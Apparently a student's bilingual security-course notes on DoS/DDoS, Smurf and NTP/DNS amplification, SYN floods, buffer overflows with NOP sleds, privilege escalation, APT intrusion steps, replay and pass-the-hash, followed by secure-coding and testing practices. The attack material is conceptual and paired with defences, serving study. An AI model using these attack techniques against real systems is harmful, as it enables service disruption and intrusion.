amplifies the concepts of a DoS attack by using multiple computer
systems (often through botnets) to conduct the attack against a single organization.
attacks often include sustained, abnormally high network traffic on the network interface card of the attacked computer.
Other system resource usage (processor, memory usage...) will also be abnormally high.
The goal: perform a service attack and prevent legitimate authorized users from accessing services on the target computer.
The servers can be physically busy, or consumes all of the available
bandwidth.
  - overload the resources (such as the processor and memory) and lead to resource exhaustion.
  - preventing legitimate users from viewing web pages.
  - In extreme cases of resource exhaustion, the attacked
computer might crash.
exploit the inherent weaknesses of dedicated networks like DSL and
cable.
  - These permanently attached systems usually have little, if any,
protection.
Load attack program onto dozens, hundreds of computer that use DSL/cable modems.
The attack program lies dormant on these computers until they get an
             - ▪


## attack signal from a master computer. The signal triggers the systems, which launch an attack simultaneously on the target network or system.
  - The systems infacted: zombies or nodes, carry out the instruction by the master computer.
common on the Internet, hit large companies, often widely publicized in the media.
DDoS: far more common and effective than DoS.
The nasty part: the machines operate attack belong to normal
computer users and the attack gives no special warning to those users. When the attack is complete, the attack program may remove itself or infect the unsuspecting user’s computer with a virus that destroys the hard drive, thereby wiping out the evidence.
example of DDoS programs: Tribal Flood Network (TFN), Shaft and Trinoo.
Prevent
In general, little that you can do to prevent DoS or DDoS attacks. Many operating systems are particularly susceptible to these types of
attacks.
Make sure that your operating system and the applications you use are up-to-date.
Use traceback to identify the source of the flooded pakcets. ⁃
  - IP spoofing
Implement filter to remove flooded packets. Before it reach the host. ⁃
透過異常行為檢測DoS的方法: (1)定行為的正常值
(2)分時、分段 (3)改變點的偵測
         The downside: the source is most likely innocent but
compromised machines.
  The downside: will be filtering out some legitimate packets as
well.
   ▪


## ICMP Attacks
Availability Attacks
Many networks permit the use of ICMP traffic (like ping...), because pings can be useful for network
troubleshooting.
attackers can use ICMP for DoS attacks.
ICMP DoS attack variant:
ping of death
uses ICMP packets that are too big.
sends ICMP traffic as a series of fragments, to overflow the fragment reassembly buffers on the target device.
network attacks, sending an abnormally large packet size that exceeds TCP/IP specifications.
This is when an IP datagram is received with the "protocol"
field in the IP header set to 1 (ICMP), the Last Fragment bit is set, and (IP offset ` 8) + (IP data length) >65535.
  - the IP offset (which represents the starting position of this fragment in the original packet, and which is in 8-byte units) plus the rest of the packet is greater than the maximum size for an IP packet.
       ▪


## Smurf attack can use ICMP traffic,
Ping a broadcast address using a spoofed source
address
directed to a subnet, to flood a target system with ping replies.
attacker sends a ping to the broadcast address of subnet 172.16.0.0/16.
This collection of pings instruct devices on that subnet to send their ping replies to the target system at IP address
10.2.2.2,
thus flooding the target system’s bandwidth and processing resources.
in the subnet being used for the Smurf attack,
thousands of systems could potentially be involved and send ping replies to the target system.
     - ▪


## Prevented smurf
Command for cisco routers: No ip directed-
 broadcasts
 Amplification
usually employed as a part of a DDoS attack.
get a response to their request in a greater than 1:1 ratio, the additional bandwidth
traffic works to congest and slow the responding server down.
significantly increases the amount of traffic sent to, or requested from, a victim.
The ratio achieved: amplification factor, and high numbers are possible with UDP- based protocols like NTP, CharGen, and DNS.
Example,
the command monlist can be used with an NTP amplification attack
to send details of the last 600 people who have requested the time from that computer back to the requester,
resulting in more than 550 times the amount of data that was requested to be sent back to a spoofed victim.
Bots can be used to send requests with the same spoofed IP source address from lots of different zombies and cause the servers to send a massive amount of data back to the victim;
for this reason, it is also referred to as reflected DoS.
Example:
- spoofs the source address of a directed broadcast ping packet to flood a
     victim with ping replies.
  - A ping is normally unicast—one computer to one computer.
  - A ping sends ICMP echo requests to one computer, and the receiving computer responds with ICMP echo responses.
  - The smurf attack: sends the ping out as a broadcast.
  - broadcast, one computer sends the packet to all other computers
in the subnet.
  - The smurf attack spoofs the source IP.
  - If the source IP address isn’t changed, the computer sending out
the broadcast ping will get flooded with the ICMP replies.
  - Instead, the smurf attack substitutes the source IP with the IP address of the victim, and the victim gets flooded with these ICMP replies.
- DNS amplification attacks
  - send DNS requests to DNS servers spoofing the IP address of the
victim.
  - Instead of just asking for a single record,these attacks tell the DNS servers to send as much zone data as possible, amplifying the data sent to the victim.
  - Repeating this process from multiple attackers can overload the victim system.
- Network Time Protocol (NTP) amplification attack
  - uses the monlist command: sends a list of the last 600 hosts that
connected to the NTP server.
  - the attacker spoofs the source IP address when sending the command.
  - The NTP server then floods the victim with details of the last 600 systems that requested the time from the NTPserver. SYN Flood Attacks
- a common attack used against servers on the Internet.
- Easy to launch, difficult to stop, can cause significant problems.
- disrupts the TCP handshake process and can prevent legitimate clients from connecting.
- TCP sessions use a three-way handshake when establishing a session.
  - 2 systems normally start a TCP session by exchanging three packets in
a TCP handshake.
  - Example:
  - when a client establishes a session with a server, it takes the following
steps:
1. The client sends a SYN (synchronize) packet to the server.
2. The server responds with a SYN/ACK (synchronize/ acknowledge) packet.
3. The client completes the handshake by sending an ACK (acknowledge) packet.
4. Afterestablishingthesession,thetwo systems exchangedata.
⁃
 - the attacker never completes the handshake by sending the ACK packet.
- the attacker sends a barrage of SYN packets, leaving the server with multiple
half-open connections.
  - server一旦接收到SYN包就需要为即将建立的TCP连接分配TCB (Transmission Control Block)，并进入half-open状态
  - 由于最多可开启的半开连接个数是一定的，受内存限制，当半开连接的个 数过多，就会消耗掉可用的内存，使得新的正常的连接请求不能被处理。 此时 victim 对 server 进行访问，建立 TCP 连接的请求就不能被正常处理。
  - half-open connections can consume resources and can actually crash.
- More often, the server limits the number of these half-open connections.
  - Once the limit is reached, the server won’t accept any new connections, blocking connections from legitimate users.
- example:
  - Linux: support iptables command: set a threshold for SYN packets,
blocking them after the threshold is set.
  - prevents the SYN flood attack from crashing the system, but also denies service to legitimate clients.
- Attackers can launch SYN flood attacks from a single system in a DoS attack.
  - often spoof the source IP address when doing so.
- Attackers can also coordinate an attack from multiple systems using a DDoS
attack.
protect your network against SYN Flood attacks. - SYN cookies. 在ACK到达之前不分配任何资源。   - Instead of allocating a record, send a SYN-ACK with a carefully constructed sequence number generated as a hash of the clients IP address, port number, and other information.
  - When the client responds with a normal ACK, that special sequence number will be included, which the server then verifies.
  - Thus, the server first allocates memory on the third packet of the handshake, not the first.
- RST cookies
  - The server sends a wrong SYN/ACK back to the client. The client should then generate a RST packet telling the server that something is wrong.
  - At this point, the server knows the client is valid and will now accept incoming connections from that client normally
- Stack Tweaking 拧
  - TCP stacks can be tweaked in order to reduce
the effect of SYN floods.
  - Reduce the timeout before a stack frees up the
memory allocated for a connection
- Micro Blocks.
  - Instead of allocating a complete connection,
  - simply allocate a micro record of 16- bytes for the
incoming SYN object
校验和
TCP的校验和计算 和 IP头部的校验和计算方法是一致的，但是覆盖的数据范围不一 样。 ▪


##  TCP校验和覆盖TCP首部和TCP数据，
IP 首部中的校验和只覆盖 IP 的头部。
TCP的校验和是必需的，而UDP的校验和是可选的。
TCP和UDP计算校验和时，都要加上一个12字节的伪首部。
伪首部包含:源 IP 地址、目的 IP 地址、保留字节 (置 0)、传输层协议号 (TCP 是 6)、TCP 报文⻓度 (报头 + 数据)。
伪首部是为了增加 TCP 校验和的检错能力:如检查 TCP 的源和目的 IP 地址、传 输层协议等。
     Sinkholing可以将网络中的数据流量进行有目的的转发 既可以是针对正常的数据流量也可以在发生网络攻击时作为一种防御措施。
当一个僵尸网络中的肉鸡向服务器发送数据时，就可以使用 sinkholing 技术将这些数据 流量进行有目的的转发，以此来对僵尸网络进行监控、查找受到影响的域 IP 地址，最终 瓦解僵尸网络的攻击，让那些肉鸡无法接受命令。
政府执法部⻔可以用这种技术来调查大规模的网络犯罪活动。
日常生活中，各类互联网基础设施运营商和内容分发网络都会使用这种技术来保护自己 的网络和用户免受攻击，调整网络内的数据流量分布情况。
Law enforcement seize domain. Then point domain to null IP. All requests to that domain just get "lost" are dropped.
 最著名的例子就是 Marcus Hutchins 利用 sinkholing 技术成功阻止了 WannaCry 恶意勒索 软件的传播。
当 WannaCry 正在大规模发作时，他和其他的研究人员对这个恶意勒索软件进行反编 译，在其中找到了一个弱点。WannaCry 会指向一个特定的网址，但该网址域名不属于 任何人，因此他就用 10.69 美元买下并启用了该域名。
在 WannaCry 的代码中，如果检测到该域名被启用，那么程序自动停止运行。正是由于 这样的操作挽救了全球无数电脑免受攻击，WannaCry 背后的开发人员疏忽了，只会对 静态域名进行检测而不是动态域名的检测。
Marcus Hutchins通过设置买下的域名，将所有WannCry的数据流量转发到自己建立的 sinkhole服务器上，然后研究这些数据流量。
当他注册了该域名后，由于 WannaCry 的大量数据导致了 sinkhole 服务器已经逼近最大 负载。
虽然他的 sinkhole 服务器不能挽救已经中招的电脑，也不能阻止 WannaCry 的传播，但 是给网络安全人员留出了宝贵时间来采取相应的防护措施。
Memory BufferVulnerabilities
Many application attacks take advantage of vulnerabilities in a system’s memory or buffers.
an input validation attack
Memory Leak
a bug in a computer application
causes the application to consume more and more memory the longer it runs.
In extreme cases, the app consume so much memory that the operating system crashes.
typically caused by an application that reserves memory for short-term use, but never releases it.
Example
a web application
  - collects user profile data to personalize the browsing experience for users.
  - But collects data every time a user accesses a web page and it never releases the memory used to store the data.
  - Over time, the web server will run slower and slower and eventually need to be rebooted.
Integer Overflow
integer overflow attack: use or create a numeric value that is too big for an application to handle.
Result: the application gives inaccurate results. Example
an application reserves 8 bits to store a number
  - it can store any value between 0 and 255.
  - If the application attempts to multiply two values such as 95 × 59, the
result is 5,605.
  - This number cannot be stored in the 8 bits, causes integer overflow
error.
  - double- check the size of buffers, ensure they can handle any data generated by the applications.
In some situations, an integer overflow error occurs if an application expects a - ▪


## positive number, but receives a negative number instead.
If the application doesn’t have adequate error- and exception-handling routines,
this might cause a buffer overflow error.
Buffer Overflows
an application receives more /different input than it’s programmed to accept. can cause an application
  ⁃
⁃
to terminate
  - leave the system sending the data with temporary access to privileged levels in the attacked system.
To overwriting: write data beyond the end of the allocated space.   - can cause important data to be lost.
sends data that exceed a buffer capacity, causing an overflow of data. These data can be interpreted as executable code, run and give the attacker system level privileges on the web server.
an input validation attack, Usually is the result of:
  - a programming error in the development of the software.
  - weak or nonexistent parameter checking in the processing software.
⁃
 ▪


##  Example:
less common than past, but still represent a large problem.
  Example:
sending a long string to the system to createabufferoverflow:   - GET /index.php?
⁃
The buffer overflow exposes a vulnerability,
but it doesn’t necessarily cause damage by itself.
However, once attackers discover the vulnerability, they exploit it and overwrite memory locations with their own code.
If the attacker uses the buffer overflow to crash the system or disrupt its services, it is a DoS attack.
More often, the attacker’s goal is to insert malicious code in a memory location that the system will execute.
  - It’s not easy for an attacker to know the exact memory location where 2,013 the malicious code is stored, making it difficult to get the computer to execute it. However, an attacker can make educated guesses to get close.
  - A popular method that makes guessing easier is with no operation (NOP, pronounced as “no-op”) commands, written as a NOP slide or NOP sled.
  - Many Intel processors use hexadecimal 90 (often written as x90) as a NOP command, so a string of x90 characters is a NOP sled.
  - The attacker writes a long string of x90 instructions into memory, followed by malicious code.
  - When a computer is executing code from memory and it comes to a NOP, it just goes to the next memory location.
  - With a long string of NOPs, the computer simply slides through all of them until it gets to the last one and then executes the code in the next instruction.
  - If the attacker can get the computer to execute code from a memory location anywhere in the NOP slide, the system will execute the attacker’s malicious code.
The malicious code varies.
code to spread a worm through the web server’s network.
code modifies the web application so that the web application tries to infect every user who visits the web site with other malware.
A buffer overflow attack includes several different elements, but they happen all at once.
The attacker sends a single string of data to the application. The first part of the string causes the buffer overflow. The next part of the string is a long string of NOPs followed by the attacker’s malicious code, stored in the attacked system’s memory.
Last, the malicious code goes to work.
In some cases, an attacker writes a malicious script to discover buffer overflow vulnerabilities.
Example:
the attacker use JavaScript to send random data to another service on the same system.
error-handling routines and input validation can prevent buffer overflows, but don’t prevent them all.
Attackers occasionally discover a bug allowing them to send a specific string of data to an application, causing a buffer overflow.
When vendors discover buffer overflow vulnerabilities, they are usually quick to release a patch or hotfix.
For administrator solution: Keep the systems up to date with current patches.
A buffer overflow attack is one that should never be successful in modern technology but still remains a great weapon in your arsenal because of poorly designed applications.
- To truly use this attack, you’re probably going to have to become a good computer programmer,
- many Metasploit-like tools make this much easier for you to attempt.
- In the real world, the best hackers are usually exceptional ▪


## programmers—it’s just a fact of life.
NOTE Buffer overflow is also referred to as smashing the stack.
The most basic definition: an attempt to write more data into an application’s prebuilt buffer area in order to overwrite adjacent memory, execute code, or crash a system (application).
In addition to good coding techniques, to avoid allowing the overflow in the first place, sometimes developers can use “canaries” or “canary words.”
canary words are known values placed between the buffer and control data. If a buffer overflow occurs, the canary word will be
altered first, triggering a halt to the system.
- Tools such as StackGuard make use of this for stack protection.
NOTE All of these are memory management attacks that take
advantage of how operating systems store information. While canary words are good for test purposes, address space layout randomization (ASLR) and data execution prevention (DEP) are extremely common mechanisms to fight most of these attacks.
 Form/Hidden field manipulation.
- altering the data in a hidden field
- in order for an application to use attack-related data.
Pointer Dereference
Programming languages such as C, C++, and Pascal commonly use pointers, which simply store a reference to something. Some languages such as Java call them references.
- Example:
- imagine an application has multiple modules.
- When a new customer starts an order, the application invokes the CustomerData module.
- This module needs to populate the city and state in a form after the user enters a zip code.
- How does the module get this array?
- One way is to pass the entire array to the module when invoking it. However, this consumes a lot of memory.
- The second method is to pass a reference to the data array, which is simply a pointer to it.
  - This consumes very little memory and is the preferred method.
  - This method uses a pointerdereference. ▪


## - Imagine the pointer is named ptrZip and the name of the full data array is named arrZip.
- The value within ptrZip is arrZip, which references the array.
- What is this thing that the pointer points to? There isn’t a standard name, but
some developers refer to it as apointee.
What’s the point?
- A failed dereference operation can cause an application to crash.
- In some programming languages, it can subtly corrupt memory, which can be even worse than a crash.
- The subtle, random changes result in the application using incorrect data.
- This can often be difficult to troubleshoot and correct.
The cause of a failed dereference operation is a pointer that references a nonexistent pointee.
- Admittedly, this programming error would be quickly discovered because the CustomerData module wouldn’t correctly populate the city and state.
- However, other pointer dereferencing problems aren’t so easy to discover.
Privilege Escalation
user gaining more privileges than they should have.
perform tasks they should not be allowed to do (delete, view data...)
Example:
often associated with bugs left in software:
  - Backdoor that allows developer to become root user to fix something
   during the debugging phase.
  - After debugging is done, before the software goes live, these abilities are removed.
  - If a developer forgets to remove the backdoor, it leaves the ability for an attacker to take advantage of the system.
remote access Trojans (RATs)
  - to gain access to a single system.
  - They typically have limited privileges (a combination of rights and
permissions) when they first exploit a system.
  - However, they use various privilege escalation techniques to gain more and more privileges.
Privilege escalation
Privilege escalation: occurs when a user / process accesses elevated rights and permissions.
Combined,rightsandpermissions areprivileges.Whenattackersfirstcompromisea system,theyoftenhave minimalprivileges.
However, privilege escalation tactics allow them to get more and more privileges. malware will use various privilege escalation techniques to gain more and more
privileges on the user’s computer and within the user’s network.
If users are logged on with administrative privileges, it makes it much easier for the malware to gain control of the user’s system and within the network.
This is one of the reasons organizations require administrators to have two accounts. one account for regular use and one for administrative use.
The only time they would log on with the administrator account is when they are performing administrative work.
This reduces the time the administrative account is in use, and makes it more difficult for the malware to use privilege escalation techniques.
One Click Lets Them In
only takes one click by an uneducated user to give an attacker almost unlimited access to an organization’s network.
outlines the process APTs have used to launch attacks.
 Figure 6.1: Steps in an attack
the attacker (located in the attacker space) can be located anywhere in the world, and only needs access to the Internet.
The neutral space: might be servers owned or operated by the attackers. the attackers use servers owned by others, but controlled by the attackers, such as servers in a botnet.
The victim space: is the internal network of the target. steps in an attack:
1. The attacker uses open-source intelligence to identify a target.
2. Next, the attacker crafts a spear phishing email with a malicious link.
  - might include links to malware hosted on another site and encourage the user to click the link.
  - this link can activate a drive-by download that installs itself on the user’s computer without the user’s knowledge. Cozy Bear (APT 29) used this technique and at least one targeted individual clicked the link.
  - Similarly, criminals commonly use this technique to download ransomware onto a user’s computer.
  - In other cases, the email might indicate that the user’s password has expired and the user needs to change the password or all access will be suspended. Fancy Bear (APT 28) used a similar technique.
3. The attacker sends the spear phishing email to the recipient from a server in the neutral space. This email includes a malicious link and uses words designed to trick the user into clicking it.
4. If the user clicks on the link, it takes the user to a web site that looks legitimate. This web site might attempt a drive-by download, or it might mimic a legitimate web site and encourage the user to enter a username and password.
5. If the malicious link:
  - tricked the user into entering credentials, the web site sends the
information back to the attacker.
  - installed malware on the user’s system, such as a RAT, the attacker uses
it to collect information on the user’s computer (including the user’s
credentials, once discovered) and sends it back to the attacker.
6. The attacker uses the credentials to access targeted systems. In many cases,
the attacker uses the infected computer to scan the network for
vulnerabilities.
7. The attacker installs malware on the targeted systems.
8. This malware examines all the available data on these systems, such ▪


## as emails and files on computers and servers.
9. The malware gathers all data of interest and typically divides it into
encrypted chunks.
10. Theseencryptedchunksareexfiltratedoutofthenetworkand backtothe
attacker.
responding to an Attack
When log files indicate that an intruder entered your system.
The first thing that you should do is to make a list of questions that you should begin asking to deal with the situation, questions you should consider:
1. How can you show that a break-in really occurred?
2. How can you determine the extent of what was done during the entry?
3. How can you prevent further entry?
4. Whom should you inform in your organization?
5. What should you do next?
6. who you should inform in your organization. It’s important to know the escalation procedures without hesitation and to be able to act quickly.
Zero-Day Exploits
When a hole is found in a web browser / software and attackers begin exploiting it the very day it is discovered by the developer (bypassing the one-to-two-day
response time that many software providers need to put out a patch once the hole has been found)
a vulnerability or bug that is unknown to trusted sources (operating system and antivirus vendors.)
- attack exploits a vulnerability before it is generally known to the public and, usually, before patches for the vulnerability have been announced and distributed.
 ▪


## - Operating system vendors write and release patches once they know about them,
  - but until the vendors know about them, the vulnerability remains.
difficult to respond to a zero-day exploit.
  - If attackers learn of the weakness the same day as the developer,
  - then they have the ability to exploit it until a patch is released.
Often, the only solution:
  - between the discovery of the exploit and the release of the patch, is to
turn off the service.
  - only way to keep the network safe.
Example
  - Stuxnet: using a total of four zero-day vulnerabilities to spread
  - the Heartbleed vulnerability: existed for a couple of years before it was widely published. Up until the time that OpenSSL developers released a fix, everyone using it was vulnerable.
- Example
- a bug existed in the virtual DOS machine (VDM)
- shipped with every version of 32-bit Windows systems from 1993 to 2010.
- The bug allowed attackers to escalate their privileges to full system level,
effectively allowing them to take over the system.
- Google researcher Tavis Ormandy stated that he reported the bug to
Microsoft in mid-2009. At this point, Microsoft (the vendor) knew about the bug, but didn’t release a work-around until January 2010 and a patch until February 2010.
- Because the bug wasn’t known publicly until January 2010, it remained a zero-day vulnerability untilthen.
   ▪


## ▪
- Both attackers and security experts looking for new threats, such as zero-day
vulnerabilities.
- Attackers want to learn about them so that they can exploit them.
- security experts want to know about them so that they can help ensure that
vendors patch them before causing damage to users.
- No matter how great an antivirus company is at identifying new malware, there is always going to be a lag between the time when criminals release the malware and the antivirus company releases new signatures to discover it.
- This is especially true when attackers are releasing more than 200,000 new variants of malware daily. This includes malware designed to take advantage of zero-day vulnerabilities.
- users need to practice safe computing habits. can’t depend on the antivirus software and other technical controls to protect them.
- Some basic guidelines are:
Don’t click on links within emails from unknown sources (no matter how curious you mightbe).
Don’t open attachments from unknown sources. Malware can be embedded into many different files, such as Portable Document Format (PDF) files, Word documents, Zipped (compressed) files, and more.
Be wary of free downloads from the Internet. (Trojans entice you with something free, but they include malware.)
Limit information you post on social media sites. (Criminals use this to answer password reset questions.)
     ▪


##  Back up your data regularly (unless you’re willing to see it disappear forever).
Keep your computer up to date with current patches (but beware of zero-day exploits).
Keep antivirus software up to date (but don’t depend on it to catch everything).
Stuxnet
a great example of the need to protect embedded systems, like SCADA systems.
a computer worm designed to attack a specific embedded system used in one of Iran’s nuclear enrichment facilities.
It caused centrifuges to spin fast enough to tear themselves apart and some reports indicated it destroyed as many as 20 percent of these centrifuges.
Security expert Roel Schouwenberg completed extensive research on Stuxnet and identified how it operated in six major steps:
1. Infection. Stuxnet first infected Windows systems through infected USB drives after someone plugged one into the system. One of the architects of Stuxnet reportedly said “...there is always an idiot around who doesn’t think much about the thumb drive in their hand.” Indeed, USB sticks have been the source of many infections.
2. Search: checks the network of the infected system looking for the targeted system.
3. Update. If it finds the targeted system, it downloads an updated version of the worm.
4. Compromise. It then attempts to compromise the targeted system. When first released, Stuxnet took advantage of four zero-day vulnerabilities. Zero-day vulnerabilities are either unknown to the vendor, or the vendor hasn’t released a patch for them yet.
5. Control. It then sends signals to the systems. A late version of Stuxnet told 2,025

the systems to spin the centrifuges uncontrollably.
6. Deceive and destroy. While it was causing the centrifuges to spin out of control, it was sending false data to engineers monitoring the system. Monitoring systems indicated everything was fine.
Replay Attacks
Replay attacks: becoming quite common
a kind of access or modification attack.
occur when information is captured over a network. The attacker capture the information and replay it later.
also occur with security certificates from systems Example:
  - Kerberos:
  - the attacker resubmits the certificate, hoping to be validated by the
authentication system and circumvent any time sensitivity.
  - the attacker gets legitimate information, records it.
  - the attacker later relays information to gain access.  ⁃
the attacker will have all of the rights and privileges from the original certificate. This is the primary reason that most certificates contain a unique session identifier
and a time stamp.
  - If the certificate has expired, it will be rejected,
  - and an entry should be made in a security log to notify system administrators.
Pass the Hash LanMan)
  - in which the password hash remains static from session to session until the password is changed.
  - Attacker send an authenticated copy of the password hash value (along with a valid username) and authenticate to any remote server (Windows, Unix...) that is accepting LM or NTLM authentication.
  - Solution: Disable NTLM
Secure Coding
Applications often provide an avenue for attackers to generate attacks unless developers create them using secure coding concepts.
Compiled, Runtime Code
Compiled code
has been optimized by an application (compiler) and converted into an executable file.
The compiler checks the program for errors and provides a report of items developers might like to check.
Some commonly used compiled programming languages are C, C++, Visual Basic, and Pascal.
Runtime code:
code that is evaluated, interpreted, and executed when the code is run. Example
HTML is the standard used to create web pages.
 It includes specific tags that are interpreted by the browser, when it renders the web page.
HTML-based web pages are interpreted at runtime.
Many languages use a cross between compiled and runtime code.
Example
Python is an interpreted language, widely used to create sophisticated web sites. However, when it is first run, the Python interpreter compiles it.
The server will then use the compiled version each time it runs.
If the system detects a change in the Python source code, it will recompile it.
Input Validation
the practice of checking data for validity before using it.
prevents an attacker from sending malicious code
use by either sanitizing the input to remove malicious code or rejecting the input.
Improper input handling (or the lack of input validation) is one of the most common security issues on web-based applications.
It allows many different types of attacks
buffer overflow attacks, SQL injection, command injection, and cross-site scripting attacks.
Some common checks performed by input validation include:
Verifying proper characters:   - Some fields such as a zip code use only numbers, whereas other fields such as state names use only letters.
  - Example:
  - a phone number uses only numbers and dashes.
  - Developers configure input validation code to check for specific character types, and even verify that characters are entered in the correct order.
  - a telephone number mask of ###-###-#### accepts only three numbers, a dash, three numbers, a dash, and four numbers.
Implementing boundary or range checking:
  - ensure that values are within expected boundaries or ranges.
  - Example
  - maximum purchase for a product is three, a range check verifies the quantity is three or less.
  - identifies data outside the range as invalid, the application does not use it.
Blocking HTML code.
  - Some malicious attacks embed HTML code within the input as part of an attack.
  - These can be blocked by preventing the user from entering the HTML code, such as the < and >characters.
Preventing the use of certain characters.
  - Example
  - SQL injection attacks, use specific characters such as the dash (-),
apostrophe (‘), and equal sign (=).
  - Blocking these characters helps to prevent theseattacks. Client-Side and Server-Side Input Validation
It’s possible to perform input validation at the client and the server.
Client-side execution:
indicates that the code runs on the client’s system, such as a user’s web browser. quicker, but is vulnerable to attacks.
Server-side execution:
indicates that the code runs on the server, such as on a web server.
takes longer, but secure, ensures the application doesn’t receive invalid data.
Many applications use both.
Example:
Homer is using a web browser to purchase the newest version of Scrabbleships through the Duff web site.
Customers cannot purchase more than three at a time.
In client-side input validation: the validation code is included in the HTML page sent to Homer. If he enters a quantity of four or more, the HTML code gives him an error message, and doesn’t submit the page to the server until Homer enters the correct data.
  - to bypass client-side validation techniques.
  - Many web browsers allow users to disable JavaScript in the web
browser, which bypasses client-side validation.
It’s also possible to use a web proxy to capture the data sent from the client in the
HTTP POST command and modify it before forwarding to the server. Server-side input validation: checks the inputted values when it reaches the server. This ensures that the user hasn’t bypassed the client-side checks.
Using both client-side and server-side validation provides speed and security.
The client- side validation checks prevent round-trips to the server until the user has entered the correct data.
The server-side validation is a final check before the server uses the data.
Other Input Validation Techniques
Other input validation techniques attempt to sanitize HTML code before sending it to a web browser.
These methods are sometimes referred to as escaping the HTML code or encoding the HTML code.
Example:
the greater than symbol (>) can be encoded with the ASCII replacement characters (&gt;). Doing so, along with following specific guidelines related to not inserting untrusted data into web pages, helps prevent many web application attacks.
Most languages include libraries that developers can use to sanitize the HTML code.
Example
the Open Web Application Security Project (OWASP) Enterprise Security API (ESAPI)
free, open source library available for many programming languages.
It includes a rich set of security-based tools, including many used for input validation. Avoiding Race Conditions
race condition: When two or more modules of an application, or two or more applications, attempt to access a resource at the same time, cause conflict
Most application developers are aware of race conditions and include methods to avoid them when writing code.
developers aren’t aware of race conditions, a race condition can cause significant problems.
Example
buying a plane ticket online and use the web application to pick your seat.
You find a window seat and select it.
However, at the same time someone else is, too.
You both make the purchase at the same time and you both have tickets with the same seat number.
Online ticketing applications for planes, concerts, and other events avoid this type of race condition.
lock the selection before offering it to a customer.
double-check for a conflict later in the process.
Most database applications have internal concurrency control processes to prevent two entities from modifying a value at the same time.
Error Handling
Error-handling and exception-handling routines ensure an application can handle an error gracefully. They catch errors and provide user-friendly feedback to the user. improper error- handling techniques within an application:
  - cause the application to fail.
  - can cause the operating system to crash.
effective error- and exception-handling routines: protects the integrity of the
underlying operating system.
Improper error handling can often give attackers information about an application.
When an application doesn’t catch an error, it often provides debugging information that attackers can use against the application.
In contrast, when an application catches the error, it can control what information it shows to the user.
There are two important points about error reporting:
Errors to users should be general:
  - Detailed errors provide information that attackers can use against the system, so the errors should be general.
  - Attackers can analyze the errors to determine details about the system.
  - Example:
  - an application is unable to connect with a database
  - a detailed error can let the attacker know exactly what type of database the system is using, what types of commands the system will accept.
  - Also, detailed errors confuse most users. Detailed information should be logged.
  - Detailed information on the errors typically includes debugging information.   - By logging this information, it makes it easier for developers to identify what caused the error and how to resolve it.
Cryptographic Techniques
Some of these techniques can also be used when applying secure coding techniques.
In general, sensitive data is often encrypted to prevent the unauthorized disclosure of data.
If an application is accessing any sensitive data, developers need to ensure that this access doesn’t result in inadvertent data exposure.
Example:
application accesses encrypted data on a different server, the application needs to ensure that the data is encrypted while in transit.
Applications need to decrypt data before processing it. When done processing the data, applications need to encrypt the data before storing it.
Additionally, applications need to ensure that all remnants of the data are flushed from memory.
Certificates are used for various purposes such as authenticating users and computers. They can also be used to authenticate and validate software code.
Example:
developers can purchase a certificate and associate it with an application or code
code signing process provides a digital signature for the code, certificate includes a hash of the code.
This provides two benefits.
First, the certificate identifies the author. Second, the hash verifies the code has not been modified.
Code Reuse and SDKs
Developers are encouraged to reuse code whenever possible.
Example:
developer created code for a web application to create, modify, and authenticate users and this code has been in use for a year.
The code has gone through internal testing and has survived the use within the application.
Instead of creating brand-new code for a new application, it’s best to use this tested code.
Code reuse saves time, prevent new bugs.
Another popular method of code reuse is the use of third-party libraries.
Example
JavaScript is a rich, interpreted language used by many web applications.
Netscape originally developed it and it was ultimately standardized as an open source language.
Software development kits (SDKs) are like third-party libraries, but they are typically tied to a single vendor.
  - Example
  - creating an Android app, you can use the Android SDK.
  - It includes software tools that will help you create apps for Android- based devices. Dead code: code that is never executed or used.
Code reuse: developers should ensure that they are using all the code they copy.
  - Example
  - Developer needs a module that will authenticate users.
  - If he copies the entire module into the new application, it creates dead code.
Logic errors can also create dead code.
  - Example
  - A function tests the value of a variable called Donuts.
  - If Donuts has a value (such as 12), it squares it.
  - If Donuts is null (a value of nothing), it returns an error and exits the function.
  - Next, the function checks to see if Donuts is null and if so, it prints a message in an error log. But. The code to print to an error log never executes.
  - If Donuts is null, the previous check exited the function, so the second check never occurs. This logic error creates the dead code.
Code Obfuscation
Developers often spend a lot of time developing code. If it is JavaScript, it is rather easy for other developers to just copy the code and use it.
One way to slow this down is with an obfuscation/camouflage method. Code obfuscation / camouflage
attempts to make the code unreadable.
like rename variables, replace numbers with expressions, replace strings of characters with hexadecimal codes, and remove comments. Example
a meaningful variable of strFirstName might be renamed to 94mdiwl,
and the number 11 might be changed to 0xF01B – 0x73 – 0xEF9D (which still results in the decimal number 11).
It’s worth noting that most security experts reject security through obscurity as a reliable method of maintaining security.
Similarly, code obfuscation might make the code difficult to understand by most people. However, it’s still possible for someone with skills to dissect the code.
Code Quality and Testing
Testers use a variety of different methods to put the code through its paces. detect problems with the code before it goes live.
Some of the common methods of testing code include:
Static code analyzers: examines the code without executing it.
  - Automated tools can analyze code and mark potential defects.
  - Some tools work as the developer creates the code, similar to a spell checker.
  - Other tools can examine the code once it is semifinalized. Dynamic analysis: checks the code as it is running.
  - A common method is to use fuzzing.
  - uses a computer program to send random data to an application.
  - crash the program or create unexpected results, indicating a vulnerability.   - Problems discovered during a dynamic analysis can be fixed before releasing the application.
Stress testing: simulate a live environment and determine how effective or efficient an application operates with a load.
  - Example
  - a web application is susceptible to a DDoS attack.
  - A stress test can simulate a DDoS attack and determine its impact on the web application.
Sandboxing: isolated area used for testing programs.
  - application developers can test applications in a sandbox
  - changes they make will not affect anything outside the sandbox.
  - Virtual machines (VMs) are often used for sandboxing.
  - E x a m p l e : Java virtual machines include a sandbox to restrict untrusted applications.
Model verification: helps identify and remove bugs.
  - However, it’s also important that the software does what it’s meant to
do.
  - ensuring software meets specifications and fulfills its intended purpose.
Development Life-Cycle Models (SDLC)
attempt to give structure to software development projects.
Two popular models are waterfall and agile.
waterfall model: includes multiple stages going from top to bottom.
  - Each stage feeds the next stage, finish one stage, move on to the next stage.
  - When following the waterfall model strictly, you don’t go back to a stage after finishing it.
  - There are multiple variations of the waterfall model, but they all use stages.
  - However, the names of these stages vary from one model to another. Some typical stages used with the waterfall model include:
  - Requirements: The developers work with the customer to understand
  - The output of this stage is a requirements document, provides
clear guidance on what the application will do.
  - Design: Developers begin to design the software architecture in this
stage.
  - doesn’t include any detailed coding
  - focuses on the overall structure of the project.
  - Implementation: Developers write the code
  - based on the requirements and design.
  - Verification: ensures the code meets the requirements.
  - Maintenance: implements changes and updates as desired.
  - lacks flexibility. difficult to revise anything from previous stages.
